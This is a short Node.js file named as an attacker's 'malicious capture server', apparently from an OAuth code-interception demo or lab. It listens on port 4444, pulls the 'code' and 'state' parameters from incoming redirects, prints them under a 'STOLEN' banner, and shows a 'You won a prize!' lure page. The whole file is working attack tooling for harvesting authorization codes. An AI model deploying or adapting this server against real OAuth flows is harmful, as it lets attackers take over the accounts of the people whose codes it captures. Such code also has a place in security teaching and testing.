// attacker/server.js — malicious capture server
const http = require('http');

http.createServer((req, res) => {
  const url = new URL(req.url, 'http://localhost:4444');
  const code = url.searchParams.get('code');
  const state = url.searchParams.get('state');

  if (code) {
    console.log('\n========== STOLEN ==========');
    console.log('Authorization code:', code);
    console.log('State:', state);
    console.log('Full URL:', req.url);
    console.log('============================\n');
  }

  res.writeHead(200, { 'Content-Type': 'text/html' });
  res.end('<h2>You won a prize! Click here to claim.</h2>');
}).listen(4444, () => console.log('Attacker server listening on http://localhost:4444'));